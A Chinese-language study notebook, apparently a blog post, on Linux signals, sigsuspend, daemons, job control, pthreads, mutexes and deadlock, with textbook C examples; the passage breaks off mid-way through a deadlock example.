只要信号被阻塞就不会递达， 而忽略是在递达之后可选的一种处理动作。 每个信号都有两个标志位分别表示阻塞和未决，还有一个函数指针表示处理动作。 信号产生时，内核在进程控制块中设置该信号的未决标志，直到信号递达才清除该标志 SIGHUP信号未阻塞也未产生过，当它递达时执行默认处理动作。 SIGINT信号产生过，但正在被阻塞，所以暂时不能递达。虽然它的处理动作是忽略，但在没有解除阻塞之前不能忽略这个信号，因为进程仍有机会改变处理动作之后再解除阻塞。 SIGQUIT信号未产生过，一旦产生SIGQUIT信号将被阻塞，它的处理动作是用户自定义函数sighandler 信号集操作函数未决和阻塞标志可以用相同的数据类型sigset_t来存储sigset_t称为信号集， 这个类型可以表示每个信号的“有效”或“无效”状态， 在阻塞信号集中“有效”和“无效”的含义是该信号是否被阻塞， 而在未决信号集中“有效”和“无效”的含义是该信号是否处于未决状态。 gset_t类型对于每种信号用一个bit表示“有效”或“无效”状态， 至于这个类型内部如何存储这些bit则依赖于系统实现 123456#include &lt;signal.h&gt;int sigemptyset(sigset_t *set);int sigfillset(sigset_t *set);int sigaddset(sigset_t *set, int signo);int sigdelset(sigset_t *set, int signo);int sigismember(const sigset_t *set, int signo); 函数sigemptyset初始化set所指向的信号集，使其中所有信号的对应bit清零， 表示该信号集不包含任何有效信号。 函数sigfillset初始化set所指向的信号集，使其中所有信号的对应bit置位， 表示该信号集的有效信号包括系统支持的所有信号。 注意，在使用sigset_t类型的变量之前，一定要调用sigemptyset或sigfillset做初始化， 使信号集处于确定的状态。 初始化sigset_t变量之后就可以在调用sigaddset和sigdelset在该信号集中 添加或删除某种有效信号。这四个函数都是成功返回0，出错返回-1。 sigismember是一个布尔函数，用于判断一个信号集的有效信号中是否包含某种信号， 若包含则返回1，不包含则返回0，出错返回-1。 sigpending 12#include &lt;signal.h&gt;int sigpending(sigset_t *set); sigpending读取当前进程的未决信号集，通过set参数传出。调用成功则返回0，出错则返回-1 . 调用函数sigprocmask可以读取或更改进程的信号屏蔽字。 12#include &lt;signal.h&gt;int sigprocmask(int how, const sigset_t *set, sigset_t *oset); 返回值：若成功则为0，若出错则为-1 如果oset是非空指针，则读取进程的当前信号屏蔽字通过oset参数传出。 如果set是非空指针，则更改进程的信号屏蔽字，set,指向来一系列的00101010的集合 参数how指示如何更改。如果oset和set都是非空指针，则先将原来的信号屏蔽字备份到oset里， 然后根据set和how参数更改信号屏蔽字。假设当前的信号屏蔽字为mask， 下表说明了how参数的可选值 mask就是那个信号的01集合 set是我们往空信号集里面添加的信号 123456789101112131415161718192021222324252627#include &lt;signal.h&gt;#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;void printsigset(const sigset_t *set)&#123;\tint i;\tfor (i = 1; i &lt; 32; i++) if (sigismember(set, i) == 1) putchar(&#x27;1&#x27;);//当前位有效，返回1 else putchar(&#x27;0&#x27;);\tputs(&quot;&quot;);//当前位无效，返回0&#125;int main(void)&#123;\tsigset_t s, p;//变量的创建\tsigemptyset(&amp;s);//置空\tsigaddset(&amp;s, SIGINT);//添加一个信号\tsigprocmask(SIG_BLOCK, &amp;s, NULL);//把信号做成集合\twhile (1) &#123; sigpending(&amp;p);//读取当前进程未决信号集，通过p参数传出 printsigset(&amp;p); sleep(1);\t&#125;\treturn 0;&#125; 程序运行时，每秒钟把各信号的未决状态打印一遍， 由于我们阻塞了SIGINT信号，按Ctrl-C将会使SIGINT信号处于未决状态， 按Ctrl-\\仍然可以终止程序，因为SIGQUIT信号没有阻塞 捕捉信号内核如何实现信号的捕捉? 如果信号的处理动作是用户自定义函数，在信号递达时就调用这个函数，这称为捕捉信号 1). 用户程序注册了SIGQUIT信号的处理函数sighandler 2). 在执行main函数时，发生中断或异常切换到内核态 3). 在中断处理完毕后要返回用户态的main函数之前检查到有信号SIGQUIT递达 4). 内核决定返回用户态后不是恢复main函数的上下文继续执行，而是执行sighandler函 数，sighandler和main函数使用不同的堆栈空间，它们之间不存在调用和被调用的关系， 是两个独立的控制流程 5). sighandler函数返回后自动执行特殊的系统调用sigreturn再次进入内核态 6). 如果没有新的信号要递达，这次再返回用户态就是恢复main函数的上下文继续执行 就上面的流程,首先不是很懂,但是其中有些点需要注意 内核决定返回用户态后不是恢复main函数的上下文继续执行 sighandler和main函数使用不同的堆栈空间，它们之间不存在调用和被调用的关系 如果没有新的信号要递达，这次再返回用户态就是恢复main函数的上下文继续执行 sa_handlermain函数和信号处理函数是同一个进程地址空间中的多个控制流程 主要是修改对应的的消息处理函数 123456#include &lt;signal.h&gt;int sigaction( _in_ int signo, _in_ const struct sigaction *act, _out_ struct sigaction *oact) sigaction函数可以读取和修改与指定信号相关联的处理函数。 调用成功则返回0，出错则返回-1 signo是指定信号的编号。 若act指针非空，则根据act修改该信号的处理函数。 若oact指针非空，则通过oact接受该信号原来的处理函数。act和oact指向sigaction结构体： 与内核消息有关的结构体处理函数 1234567struct sigaction &#123; void (*sa_handler)(int); sigset_t sa_mask; int sa_flags; void (*sa_sigaction)(int, siginfo_t *, void *);//实时信号的处理函数&#125;; 参数1 sa_handler,消息处理函数的指针,可以是自己写的函数 也可以是一下一些值 常数SIG_IGN传给sigaction表示忽略信号，怎么才算忽略? 常数SIG_DFL表示执行系统默认动作，指针 如果在调用信号处理函数时，除了当前信号被自动屏蔽之外(也就是忽略再次传来的相同信号) 还希望自动屏蔽另外一些信号，则用sa_mask字段说明这些需要额外屏蔽的信号， 当信号处理函数返回时自动恢复原来的信号屏蔽字。(也就是,可以再次屏蔽传来的信号) pause12#include &lt;unistd.h&gt;int pause(void); pause函数使调用进程挂起直到有信号递达。 如果信号的处理动作是终止进程，则进程终&#x3D;止，pause函数没有机会返回； 如果信号的处理动作是忽略，则进程继续处于挂起状态，pause不返回； 如果信号的处理动作是捕捉，则调用了信号处理函数之后pause返回-1， errno设置为EINTR，所以pause只有出错的返回值。错误码EINTR表示“被信号中断”。 下面我们用alarm和pause实现sleep(3)函数，称为mysleep。 ps:pause的处理函数本身就是挂起进程吗?如果我们修改了对应的处理函数,那它的挂起还起作用吗? 下面这个函数,直接无法返回.为什么? 123456789#include&lt;stdio.h&gt;#include &lt;unistd.h&gt;int main()&#123; printf(&quot;Hello&quot;); pause(); printf(&quot;World&quot;); return 0;&#125; 首先,他和Windwos的Pause函数不同,不是说你按下pause就立马返回 无论你怎么按下空格,woc,我们可以注册一个函数,但是这个函数还是容易被发现的,woc 123456789101112131415161718192021222324252627282930313233343536#include &lt;unistd.h&gt;#include &lt;signal.h&gt;#include &lt;stdio.h&gt;void sig_alrm(int signo)&#123;\t/* nothing to do */\t//我们分配一个啥也不干的函数 puts(&quot;--------&quot;);&#125;unsigned int mysleep(unsigned int time_sleep)&#123;\tstruct sigaction newact, oldact; //创建了2个结构体,其中一个用于传入,其中一个用于传出\tunsigned int unslept=0,x=0;\tnewact.sa_handler = sig_alrm;//添加消息处理函数,函数的动作是啥也不干\tsigemptyset(&amp;newact.sa_mask);//把掩码置空,也就是谁也不屏蔽\tnewact.sa_flags = 0;//设置信号为是0\tsigaction(SIGALRM, &amp;newact, &amp;oldact);//把结构体传入,old接受原来的结构体\talarm(time_sleep);//开始计时,时间一到,发送信号\tx=pause();//程序处于挂起状态.等待信号,信号采用的是捕捉的方式,所以pause会错误返回 printf(&quot;x:%d &quot;,x); unslept = alarm(0);//取消之前的闹钟,而不是重复定义一个闹钟 sigaction(SIGALRM, &amp;oldact, NULL);//恢复以前的处理函数\treturn unslept;&#125;int main(void)&#123; int ret=0;\twhile(1) &#123; ret=mysleep(1); printf(&quot;ret:%d &quot;,ret); &#125; return 0;&#125; 上面那个程序 有些地方需要注意 alarm是注册一个闹钟 pause是等待信号,不管你是什么信号 sig_atomic_t类型与volatile限定符之前提到,过,信号处理函数和main函数之间不存在调用和被调用的关系 两者是相互独立的线程 既然是相互独立的,就会存在一个多线程的资源访问问题 sig_atomic_t 好比int之类的 它修饰变量后,变量的读写会经过编译器的优化,从而避免资源访问冲突 volatile限定符，如果将上述变量定义为volatile sig_atomic_t a&#x3D;0;那么即使指定了 优化选项，编译器也不会优化掉对变量a内存单元的读写 sig_atomic_t类型的变量应该总是加上volatile限定符，因为要使用sig_atomic_t类型的理由也 正是要加volatile限定符的理由 竞态条件与sigsuspend函数之前写了那个sleep函数 12alarm(time_sleep); x=pause();/ 现在我们考虑了一些问题 alarm注册闹钟后,可能会有闹钟信号的提取到达,对后面的处理 解除信号屏蔽”和“挂起等待信号”这两步能合并成一个原子操作就好了 这正是sigsuspend函数的功能。sigsuspend包含了pause的挂起等待功能， 同时解决了竞态条件的问题， 在对时序要求严格的场合下都应该调用sigsuspend而不是pause pause一样，sigsuspend没有成功返回值，只有执行了一个信号处理函数之后sigsuspend才返回，\\返回值为-1，errno设置为EINTR 用sigsuspend时，进程的信号屏蔽字由sigmask参数指定， 可以通过指定sigmask来临时解除对某个信号的屏蔽，然后挂起等待， 当sigsuspend返回时，进程的信号屏蔽字恢复为原来的值， 如果原来对该信号是屏蔽的，从sigsuspend返回后仍然是屏蔽的 12345678910111213141516171819202122232425262728293031323334353637383940414243444546#include &lt;unistd.h&gt;#include &lt;signal.h&gt;#include &lt;stdio.h&gt;void sig_alrm(int signo)&#123;/* nothing to do */&#125;unsigned int mysleep(unsigned int nsecs)&#123;\tstruct sigaction newAction, oldAction;\tsigset_t newMask, oldMask, suspMask;\tunsigned int unslept; //注册信号处理函数 newAction.sa_handler = sig_alrm;\tsigemptyset(&amp;newAction.sa_mask);\tnewAction.sa_flags = 0;\tsigaction(SIGALRM, &amp;newAction, &amp;oldAction);//修改 SIGALRM 的处理函数 //屏蔽 SIGALRM sigemptyset(&amp;newMask);\tsigaddset(&amp;newMask, SIGALRM);\tsigprocmask(SIG_BLOCK, &amp;newMask, &amp;oldMask); alarm(nsecs);//注册闹钟 //挂起等待\tsuspMask = oldMask;\tsigdelset(&amp;suspMask, SIGALRM); sigsuspend(&amp;suspMask); //单独监听SIGALRM，然后挂起等待待 unslept = alarm(0);//取消闹钟 sigaction(SIGALRM, &amp;oldAction, NULL); //恢复SIGALRM的处理函数 sigprocmask(SIG_SETMASK, &amp;oldMask, NULL);//不再屏蔽 return (unslept);&#125;int main(void)&#123;\twhile(1)\t&#123; mysleep(2); printf(&quot;Two seconds passed &quot;);\t&#125;\treturn 0;&#125; 关于SIGCHLD信号子进程在终止时会给父进程发SIGCHLD信号，该信号的默认处理动作是忽略，父进程可以 自定义SIGCHLD信号的处理函数，这样父进程只需专心处理自己的工作，不必关心子进程了，子 进程终止时会通知父进程，父进程在信号处理函数中调用wait清理子进程即可 ps: 请编写一个程序完成以下功能：父进程fork出子进程，子进程调用exit(2)终止，父进程自定 义SIGCHLD信号的处理函数，在其中调用wait获得子进程的退出状态并打印 用sigaction将SIGCHLD的处理动作置为SIG_IGN，这样fork出来的子进程在终止时会自动清理 掉，不会产生僵尸进程，也不会通知父进程。系统默认的忽略动作和用户用sigaction函数自定 义的忽略通常是没有区别的，但这是一个特例。此方法对于Linux可用，但不保证在其它UNIX系 统上都可用。请编写程序验证这样做不会产生僵尸进程 小结sa_handler主要讲了一些和消息处理函数有关的东西 pause没太多的讲 然后就是扯类一下多线程的资源访问问题(说到不是很清楚) 竞态条件和siguspend主要讲了由pause引发的问题,然后sigsuspend可以处理 SIGCHILD信号常和僵尸进程的处理相关 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364#include &lt;sys/wait.h&gt;#include&lt;sys/types.h&gt;#include&lt;unistd.h&gt;#include&lt;stdio.h&gt;#include&lt;stdlib.h&gt;#include&lt;errno.h&gt;#include &lt;signal.h&gt;//自定义信号#define SIG_MY_DEFINE_TEST __SIGRTMIN+10//信号处理函数的构建void sigactionProcess(int nsig)&#123;\tprintf(&quot;S GetMsg :%08X &quot;, getpid()) ;\texit(0);&#125;//信号处理函数的注册void MegReg(void)&#123;\tstruct sigaction NewAct,OldAct;\tNewAct.sa_handler = sigactionProcess;\tNewAct.sa_flags = 0;\tsigaction(SIG_MY_DEFINE_TEST,&amp;NewAct,&amp;OldAct);&#125;int main()&#123;\tint ret ;\tpid_t pid;\tpid=fork();\tif(pid==0)//C\t&#123; printf(&quot;S:%08X Begin &quot;,getpid()); //信号处理函数注册 MegReg(); //raise(SIGSTOP) ;//子进程暂停 while(1)&#123;&#125; printf(&quot;S:%08X End &quot;,getpid()); exit(0) ;\t&#125;\telse if(pid&gt;0)//F\t&#123; printf(&quot;F:%08X Begin &quot;,getpid()); usleep(1000*10); //获取到pid子进程没有退出,指定WNOHANG不会阻塞，没有退出会返回0 if ((waitpid(pid, NULL, WNOHANG)) == 0) &#123; //if ((ret = kill(pid, SIGINT)) == 0)//向子进程发出SIGKILL信号 if ((ret = kill(pid, SIG_MY_DEFINE_TEST)) == 0)//向子进程发出SIG_MY_DEFINE_TEST信号 &#123; printf(&quot;F kill %08X down &quot;, pid) ; &#125; &#125; waitpid(pid,NULL,0);/*等待子进程退出*/ exit(0) ;\t&#125;\telse\t&#123; perror(&quot;fork() error!&quot;); exit(-1) ;\t&#125;&#125; 终端、Job控制与守护进程终端每个进程都可以通过一个特殊的设备文件&#x2F;dev&#x2F;tty访问它的控制终端 事实上每个终端设备都对应一个不同的设备文件， &#x2F;dev&#x2F;tty提供了一个通用的接口，一个进程要访问它的控制终端既可以通过&#x2F;dev&#x2F;tty 也可以通过该终端设备所对应的设备文件来访问 ttyname函数可以由文件描述符查出对应的文件名，该文件描述符必须指向一个终端设备 而不能是任意文件 123456789#include &lt;unistd.h&gt;#include &lt;stdio.h&gt;int main()&#123; printf(&quot;fd 0: %s &quot;, ttyname(0)); printf(&quot;fd 1: %s &quot;, ttyname(1)); printf(&quot;fd 2: %s &quot;, ttyname(2)); return 0;&#125; 终端登录过程 一台PC通常只有一套键盘和显示器 但是可以通过Ctrl-Alt-F1~Ctrl-Alt-F6切换到6个字符终端， 相当于有6套虚拟的终端设备，它们共用同一套物理终端设备， 对应的设备文件分别是&#x2F;dev&#x2F;tty1~&#x2F;dev&#x2F;tty6 &#x2F;dev&#x2F;tty一样也是一个通用的接口，但它不能表示图形终端窗口所对应的终端 Job控制我说过“Shell可以同时运行一个前台进程和任意多个后台进程”其实是不全面的， 现在我们来研究更复杂的情况。事实上，Shell分前后台来控制的不是进程而是（Job）或者进程组（Process Group）。一个前台Job可以由多个进程组成，一个后台Job也可以由多个进程组成， Shell可以同时运行一个前台Job和任意多个后台Job，这称为作业控制（Job Control）。 例如用以下命令启动5个进程 12proc1 | proc2 &amp;proc3 | proc4 | proc5 proc1和proc2属于同一个后台进程组 proc3、proc4、proc5属于同一个前台进程组 Shell进程本身属于一个单独的进程组 这些进程组的控制终端相同，它们属于同一个Session setsid函数创建一个新的Session,该进程称为Session Leader,该进程的id也可以看作Session的id 在创建新Session的同时也创建了一个新的进程组， 该进程是这个进程组的Process Group Leader，该进程的id也是进程组的id。 在上面的例子中，proc3、proc4、proc5被Shell放到同一个前台进程组， 其中有一个进程是该进程组的Leader，Shell调用wait等待它们运行结束。 一旦它们全部运行结束，Shell就调用tcsetpgrp函数将自己提到前台继续接受命令 但是注意，如果proc3、proc4、proc5中的某个进程又fork出子进程， 子进程也属于同一进程组，但是Shell并不知道子进程的存在，也不会调用wait等待它结束。 这是作业和进程组在概念上的区别。一旦作业运行结束，Shell就把自己提到前台， 如果原来的前台进程组还存在（如果这个子进程还没终止），则它自动变成后台进程组 12345$ ps -o pid,ppid,pgrp,session,tpgid,comm | cat PID PPID PGRP SESS TPGID COMMAND 191 190 191 191 200 bash 200 191 200 191 200 ps 201 191 200 191 200 cat 这个作业由ps和cat两个进程组成，在前台运行 从PPID(父亲ID)列可以看出这两个进程的父进程是bash 从PGRP列可以看出，bash在id为191的进程组,这个id等于bash的进程id,所以它是组的Leader 而两个子进程在id为200的进程组中，ps是这个进程组的Leader 从SESS可以看出三个进程都在同一Session中，bash是Session Leader 从TPGID可以看出，前台进程组的id是200，也就是两个子进程所在的进程组 123456$ ps -o pid,ppid,pgrp,session,tpgid,comm | cat &amp;[1] 208PID PPID PGRP SESS TPGID COMMAND191 190 191 191 191 bash207 191 207 191 191 ps208 191 207 191 191 cat 守护进程.inux系统启动时会启动很多系统服务进程 ,这些服务进程没有控制终端，不能直接和用户交互。 其它进程都是在用户登录或运行程序时创建，在运行结束或用户注销时终止， 但系统服务进程不受用户登录注销的影响，它们一直在运行着。这种进程有一个名称叫守护进程（Daemon）。 12345678910111213ps ajxPPID PID PGID SID TTY TPGID STAT UID TIME COMMAND 0 1 0 0 ? -1 Sl 0 0:00 /init 1 16 16 16 ? -1 Ss 0 0:00 /init 16 17 16 16 ? -1 S 0 0:00 /init 17 18 18 18 pts/1 21 Ss 1000 0:00 -bash 18 21 21 18 pts/1 21 S+ 1000 0:01 vim q.c 1 190 189 189 ? -1 S 0 0:00 /init 190 250 250 250 ? -1 Rs 1000 8:21 ./q 1 254 254 254 ? -1 Ss 0 0:00 /init 254 255 254 254 ? -1 R 0 0:00 /init 255 256 256 256 pts/0 259 Ss 1000 0:00 -bash 256 259 259 256 pts/0 259 R+ 1000 0:00 ps ajx 凡是TPGID一栏写着-1的都是没有控制终端的进程，也就是守护进程。 在COMMAND一列用[]括起来的名字表示内核线程，这些线程在内核里创建，没有用户空间代码，因此没有程序文件名和命令行，通常采用以k开头的名字，表示Kernel。 init进程我们已经很熟悉了，udevd负责维护&#x2F;dev目录下的设备文件 acpid负责电源管理， syslogd负责维护&#x2F;var&#x2F;log下的日志文件， 创建守护进程最关键的一步是调用setsid函数创建一个新的Session，并成为Session Leader。 12#include &lt;unistd.h&gt;pid_t setsid(void); 该函数调用成功时返回新创建的Session的id（其实也就是当前进程的id），出错返回-1。 注意，调用这个函数之前，当前进程不允许是进程组的Leader，否则该函数返回-1 要保证当前进程不是进程组的Leader也很容易，只要先fork再调用setsid就行了。 fork创建的子进程和父进程在同一个进程组中，进程组的Leader必然是该组的第一个进程 所以子进程不可能是该组的第一个进程，在子进程中调用setsid就不会有问题了 成功调用该函数的结果是 创建一个新的Session，当前进程成为Session Leader，当前进程的id就是Session的id 创建一个新的进程组，当前进程成为进程组的Leader，当前进程的id就是进程组的idid 如果当前进程原本有一个控制终端，则它失去这个控制终端，成为一个没有控制终端的进程。 所谓失去控制终端是指，原来的控制终端仍然是打开的，仍然可以读写， 但只是一个普通的打开文件而不是控制终端了 12345678910111213141516171819202122232425262728293031#include &lt;unistd.h&gt;#include &lt;stdlib.h&gt;#include &lt;stdio.h&gt;#include &lt;fcntl.h&gt;void daemonize(void)&#123; pid_t pid; if ((pid = fork()) &lt; 0) &#123; perror(&quot;fork&quot;); exit(1); &#125; else if (pid != 0)//父进程 exit(0);//退出 setsid();//子进程成为section leader,成为group leader if (chdir(&quot;/&quot;) &lt; 0) &#123; perror(&quot;chdir&quot;); exit(1); &#125; close(0);//关闭输入流 open(&quot;/dev/null&quot;, O_RDWR); dup2(0, 1); dup2(0, 2);//把1/2作为输入流&#125;int main(void)&#123; daemonize(); while(1);&#125; 小结终端:只是简单的介绍类一下终端 Job控制:只是简单的说了一下Job的概念,Job类似于进程组,但是小于进程组 守护进程:简单提及了一下概念,和简单的创建一个守护进程 线程导入进程在各自独立的地址空间中运行，进程之间共享数据需要用mmap或者进程间通信机制 在各线程中都可以调用，如果定义一个全局变量，在各线程中都可以访问到， 除此之外，各线程还共享以下进程资源和环境： 文件描述符表 每种信号的处理方式（SIG_IGN、SIG_DFL或者自定义的信号处理函数） 当前工作目录 用户id和组id 然后是线程私有的 线程id 上下文，包括各种寄存器的值、程序计数器和栈指针 栈空间 errno变量 信号屏蔽字 调度优先级 在Linux上线程函数位于libpthread共享库中，因此在编译时要加上-lpthread选项 线程控制创建线程1234567#include &lt;pthread.h&gt;int pthread_create( _out_ pthread_t *restrict thread,//接收线程返回的ID\t_in_ const pthread_attr_t *restrict attr,//线程的属性\t_in_ void *(*start_routine)(void*), //线程函数指针 _in_ void *restrict arg //线程函数的参数指针); 返回值：成功返回0，失败返回自定义的错误号int值。 exit或_exit是退出进程,而不是u退出线程 获取线程的ID 12#include &lt;pthread.h&gt;pthread_t pthread_self(void); 1gcc q.c -o q -lpthread 1234567891011121314151617181920212223242526272829303132333435#include &lt;stdio.h&gt;#include &lt;string.h&gt;#include &lt;stdlib.h&gt;#include &lt;pthread.h&gt;#include &lt;unistd.h&gt;pthread_t ntid;void printids(const char *s)&#123; pid_t pid; pthread_t tid; pid = getpid();//获取进程 tid = pthread_self();//获取线程号 printf(&quot;%s pid %08X tid %08X &quot;, s, (unsigned int)pid, (unsigned int)tid);&#125;void *thr_fn(void *arg)//现场处理函数&#123; printids(arg); return NULL;&#125;int main(void)&#123; int err; err = pthread_create(&amp;ntid, NULL, thr_fn, &quot;new thread: &quot;); if (err != 0) &#123; fprintf(stderr, &quot;can&#x27;t create thread: %s &quot;,strerror(err));//pthread_create的错误码不保存在errno exit(1);//用strerror(3)把错误码转换成错误信息再打印 &#125; printids(&quot;main thread:&quot;); sleep(1);//为了防止新创建的线程还没有得到执行就终止，我们在main函数return之前延时1秒 return 0;&#125;main thread: pid 000000000000018B tid 00000000061E4740new thread: pid 000000000000018B tid 00000000061E3700 . 终止线程如果需要只终止某个线程而不终止整个进程，可以有三种方法： 从线程函数return。这种方法对主线程不适用，从main函数return相当于调用exit。 一个线程可以调用pthread_cancel终止同一进程中的另一个线程。 线程可以调用pthread_exit终止自己 1234#include &lt;pthread.h&gt;void pthread_exit(_in_ void *value_ptr);//常用于自杀int pthread_join( _in_ pthread_t thread_ID, _ out_ void **value_ptr);//用于接收线程返回参数int pthread_cancel(_in_ pthread_t tid);//常用语异常退出其它线程 返回值：成功返回0，失败返回错误号 调用pthread_join( ID, value_ptr);的线程将挂起等待，直到id为的线程终止。 加入A创建了线程B,A调用pthread_join( ID_B, value_ptr);函数pthread_join会阻塞A,直到线程B结束 才会结束 thread线程以不同的方法终止，通过pthread_join得到的终止状态是不同的，总结如下 (正常死亡)如果thread线程通过return返回，value_ptr所指向的单元里存放的是thread线程函数的返 回值。 (谋杀)如果thread线程被别的线程调用pthread_cancel异常终止掉，value_ptr所指向的单元里存 放的是常数PTHREAD_CANCELED&#x3D;-1。 (自杀)如果thread线程是自己调用pthread_exit终止的，value_ptr所指向的单元存放的是传 给pthread_exit的退出码 123456789101112131415161718192021222324252627282930313233343536373839404142#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;pthread.h&gt;#include &lt;unistd.h&gt;void *thr_fn1(void *arg)&#123;\tprintf(&quot;T1 Die Normally &quot;);\treturn (void *)1;&#125;void *thr_fn2(void *arg)&#123;\tprintf(&quot;T2 Kill Self &quot;);\tpthread_exit((void *)2);&#125;void *thr_fn3(void *arg)&#123;\twhile(1) &#123; printf(&quot;T2 &quot;); sleep(1);\t&#125;&#125;int main(void)&#123;\tpthread_t tid;\tvoid *tret;\tpthread_create(&amp;tid, NULL, thr_fn1, NULL);\tpthread_join(tid, &amp;tret);//自然退出,返回值是跳过ret返回 printf(&quot;T1 Return %d &quot;, (int)tret); pthread_create(&amp;tid, NULL, thr_fn2, NULL);\tpthread_join(tid, &amp;tret);//退出码 printf(&quot;T2 Exit With %d &quot;, (int)tret); pthread_create(&amp;tid, NULL, thr_fn3, NULL);\tsleep(3);\tpthread_cancel(tid);\tpthread_join(tid, &amp;tret);\tprintf(&quot;T3 Exit With %d &quot;, (int)tret); return 0;&#125; 在linux下正常退出,在windwos的gcc下,就是不退出 12345678910dqx@resmile-2:/mnt/f/0xC0de/elf/C$ ./qT1 Die NormallyT1 Return 1T2 Kill SelfT2 Exit With 2T2T2T2T3 Exit With -1dqx@resmile-2:/mnt/f/0xC0de/elf/C$ 一般情况下，线程终止后，其终止状态一直保留到其它线程调用pthread_join获取它的状态为 止。 但是线程也可以被置为detach状态，这样的线程一旦终止就立刻回收它占用的所有资源，而不保留终止状态。 不能对一个已经处于detach状态的线程调用pthread_join，这样的调用将返回EINVAL。 对一个尚未detach的线程调用pthread_join或pthread_detach都可以把该线程置为detach状态， 也就是说，不能对同一线程调用两次pthread_join， 或者如果已经对一个线程调用了pthread_detach就不能再调用pthread_join了。 12#include &lt;pthread.h&gt;int pthread_detach(pthread_t tid); 返回值：成功返回0，失败返回错误号 线程间同步Mutex互斥体主要和多线程的资源访问有关系 Mutex用pthread_mutex_t类型的变量表示，可以这样初始化和销毁： 12345678#include &lt;pthread.h&gt;int pthread_mutex_destroy(pthread_mutex_t *mutex);//销毁互斥体int pthread_mutex_init( pthread_mutex_t *restrict mutex,\tconst pthread_mutexattr_t *restrict attr//互斥体属性,NULL表示默认属性);pthread_mutex_t mutex = PTHREAD_MUTEX_INITIALIZER;//用宏定义初始化全局|静态的互斥体 //用pthread_mutex_init初始化并且attr参数为NULL 返回值：成功返回0，失败返回错误号 Mutex的加锁和解锁操作可以用下列函数 1234567#include &lt;pthread.h&gt;int pthread_mutex_lock(pthread_mutex_t *mutex);//等待的方式获取互斥体int pthread_mutex_trylock(pthread_mutex_t *mutex);\t//不等待的方式获取互斥体,\t//如果Mutex已经被另一个线程获得，这个函数会失败返回EBUSY，而不会使线程挂起等待int pthread_mutex_unlock(pthread_mutex_t *mutex);//释放互斥体 返回值：成功返回0，失败返回错误号。 123456789101112131415161718192021222324252627282930#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;pthread.h&gt;#define NLOOP 5000int counter; pthread_mutex_t counter_mutex = PTHREAD_MUTEX_INITIALIZER;void *doit(void *);int main(int argc, char **argv)&#123;\tpthread_t tidA, tidB;\tpthread_create(&amp;tidA, NULL, doit, NULL);\tpthread_create(&amp;tidB, NULL, doit, NULL); pthread_join(tidA, NULL);\tpthread_join(tidB, NULL);\treturn 0;&#125;void *doit(void *vptr)&#123;\tint i, val;\tfor (i = 0; i &lt; NLOOP ; i++)\t&#123; pthread_mutex_lock(&amp;counter_mutex); val = counter; printf(&quot;%x: %d &quot;, (unsigned int)pthread_self(),val + 1); counter = val + 1; pthread_mutex_unlock(&amp;counter_mutex);\t&#125;return NULL;&#125; lock和unlock的原理 Mutex变量的值为1表示互斥锁空闲 Mutex的值为0,表示互斥锁已经被某个线程获得 下面是一个互斥体原理的雏形,但是仍然不能够互斥 1234567891011121314151617lock()&#123; if(mutex &gt; 0) &#123; mutex = 0; return 0; &#125; else 挂起等待; goto lock();&#125;unlock()&#123; mutex = 1; 唤醒等待Mutex的线程; return 0;&#125; unlock操作中唤醒等待线程的步骤可以有不同的实现，可以只唤醒一个等待线程， 也可以唤醒所有等待该Mutex的线程，然后让被唤醒的这些线程去竞争获得这个Mutex， 竞争失败的线程继续挂起等待 如果两个线程同时调用lock，这时Mutex是1，两个线程先后都判断mutex&gt;0成立，然后其中一个线程 置mutex&#x3D;0，而另一个线程并不知道这一情况，也置mutex&#x3D;0，于是两个线程都以为自己获得了 锁。为了实现互斥锁操作，大多数体系结构都提供了swap或exchange指令，该指令的作用是把寄存 器和内存单元的数据相交换，由于只有一条指令，保证了原子性，即使是多处理器平台，访问 内存的总线周期也有先后，一个处理器上的交换指令执行时另一个处理器的交换指令只能等待 总线周期。现在我们把lock和unlock的伪代码改一下（以x86的xchg指令为例） 下面才是比较完整的原理 123456789101112131415161718lock()&#123; al=0; swapt(al, mutex) if(al寄存器的内容 &gt; 0) &#123; return 0; &#125; else 挂起等待;\tgoto lock;&#125;unlock()&#123; mutex=1 唤醒等待Mutex的线程; return 0;&#125; CPU一次只干一件事情 一定有一个人先 swapt(al, mutex) 然后另外一个人后 swapt(al, mutex) 下的那个人获取奥al&#x3D;1,后的那个人只能al&#x3D;0 或者2个人获取的都是0. 挂起等待”和“唤醒等待线程”的操作如何实现？ 每个Mutex有一个等待队列，一个线程要在Mutex上挂起等待， 首先在把自己加入等待队列中(最后一位乘客)，然后置线程状态为睡眠， 然后调用调度器函数切换到别的线程。 一个线程要唤醒等待队列中的其它线程，只需从等待队列中取出一项(第一位乘客) 把它的状态从睡眠改为就绪，加入就绪队列，那么下次调度器函数执行时就有可能切换到被唤醒的线程 (主要讲了一个等待队列和就绪队列,是调度器函数从队列的第一个拿出来执行) 死锁 eg1 假如有2个线程,线程A抓取了lock1,线程B抓取了lock2, 然后A又抓取lock2的信号,但是lock2的信号已经被占用了 然后B又抓取lock1的信号,但是lock2的信号已经被占用了 于是A&#x2F;B都会处于等待状态,2者的信号都不不释放 eg:死锁1 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374#include &lt;stdio.h&gt;#include &lt;unistd.h&gt;#include &lt;pthread.h&gt;//创建2个互斥体 pthread_mutex_t lock1;pthread_mutex_t lock2;void* ThreadA(void* arg)&#123;\t//设置进程属性为结束后自动释放进程空间 pthread_detach(pthread_self());//自己在返回的时候,立即释放 //获取互斥锁1 pthread_mutex_lock(&amp;lock1);// puts(&quot;A抓取lock1信号&quot;); sleep(3);\t//获取互斥锁2 puts(&quot;A请求B释放lock2信号......&quot;);\tpthread_mutex_lock(&amp;lock2);//执行到这里,等待对方B放锁 , .结果是2个人都不互相谦让 //解锁 pthread_mutex_unlock(&amp;lock1);\tpthread_mutex_unlock(&amp;lock2);\tputs(&quot;信号释放完毕&quot;);\treturn NULL;&#125;void* ThreadB(void* arg)&#123;\tpthread_detach(pthread_self());\t//获取互斥锁2 pthread_mutex_lock(&amp;lock2);\tputs(&quot;B抓取lock2信号&quot;); sleep(3);\tputs(&quot;B请求A释放lock1信号......&quot;);\t//获取互斥锁1 pthread_mutex_lock(&amp;lock1);//执行到这里,等待对方A放锁 .结果是2个人都不互相谦让 //解锁 ,解不开锁,因为正常情况下无法执行到这里来 